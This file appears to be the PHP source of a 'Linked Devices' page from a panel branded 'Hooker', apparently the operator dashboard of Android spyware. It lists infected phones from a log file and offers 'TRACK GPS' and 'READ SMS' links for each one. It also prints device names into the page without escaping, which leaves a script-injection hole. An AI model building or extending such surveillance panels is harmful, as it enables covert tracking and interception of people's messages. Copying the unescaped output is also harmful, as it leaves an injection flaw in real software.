<?php
$log_file = dirname(__FILE__) . '/' . "devices.log";
$deviceList = file_get_contents($log_file);
$devices = explode(PHP_EOL,$deviceList);
$devicesHTML = "";

if($deviceList != null)
{


foreach($devices as $device)
{
  $bits = explode("||",$device);
 if(count($bits) > 1)
{
  $name = $bits[0];
  $key = $bits[1];

  $devicesHTML .='
<div class="card  col-12 col-md-6">
                <div class="card-img">
                    <span class="mbr-iconfont mbri-mobile"></span>
                </div>
                <div class="card-box align-center">
                    <h4 class="card-title mbr-fonts-style display-7">ANDROID</h4>
                    <p class="mbr-text mbr-fonts-style display-7">'.$name.'</p>
                    <div class="mbr-section-btn text-center"><a href="Track.php?key='.urlencode($key).'" class="btn btn-secondary display-4">TRACK GPS</a></div>
<div class="mbr-section-btn text-center"><a href="Messages.php?key='.urlencode($key).'" class="btn btn-secondary display-4">READ SMS</a></div>
                </div>
            </div>
';
}
}
}


?>

<!DOCTYPE html>
<html >
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Mobirise v4.7.5, mobirise.com">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
  <link rel="shortcut icon" href="assets/images/logo.png-128x128.png" type="image/x-icon">
  <meta name="description" content="Site Builder Description">
  <title>Linked Devices</title>
  <link rel="stylesheet" href="assets/web/assets/mobirise-icons/mobirise-icons.css">
  <link rel="stylesheet" href="assets/tether/tether.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
  <link rel="stylesheet" href="assets/dropdown/css/style.css">
  <link rel="stylesheet" href="assets/theme/css/style.css">
  <link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
  
  
  
</head>
<body class="mbr-section">
  <section class="menu cid-tJdoQgnPQm" once="menu" id="menu2-4">

    

    <nav class="navbar navbar-expand beta-menu navbar-dropdown align-items-center navbar-fixed-top navbar-toggleable-sm bg-color transparent">
        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <div class="hamburger">
                <span></span>
                <span></span>
                <span></span>
                <span></span>
            </div>
        </button>
        <div class="menu-logo">
            <div class="navbar-brand">
                <span class="navbar-logo">
                    <a href="index.php">
                        <img src="assets/images/logo.png-128x128.png" alt="CACS" title="" style="height: 3.8rem;">
                    </a>
                </span>
                <span class="navbar-caption-wrap"><a class="navbar-caption text-white display-4" href="">Hooker<br></a></span>
            </div>
        </div>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav nav-dropdown nav-right" data-app-modern-menu="true"><li class="nav-item">
                    <a class="nav-link link text-white display-4" href="Devices.php">Linked Devices<br></a>
                </li></ul>
            
        </div>
    </nav>
</section>

<section class="features8 cid-tJds2D7tDl mbr-parallax-background" id="features8-5">

    

    <div class="mbr-overlay" style="opacity: 0.5; background-color: rgb(35, 35, 35);">
    </div>

    <div class="container">
        <div class="media-container-row">

            <?php echo $devicesHTML; ?>

            
            

            
        </div>
    </div>
</section>


  <script src="assets/web/assets/jquery/jquery.min.js"></script>
  <script src="assets/popper/popper.min.js"></script>
  <script src="assets/tether/tether.min.js"></script>
  <script src="assets/bootstrap/js/bootstrap.min.js"></script>
  <script src="assets/smoothscroll/smooth-scroll.js"></script>
  <script src="assets/dropdown/js/script.min.js"></script>
  <script src="assets/touchswipe/jquery.touch-swipe.min.js"></script>
  <script src="assets/parallax/jarallax.min.js"></script>
  <script src="assets/theme/js/script.js"></script>
  
  
</body>
</html>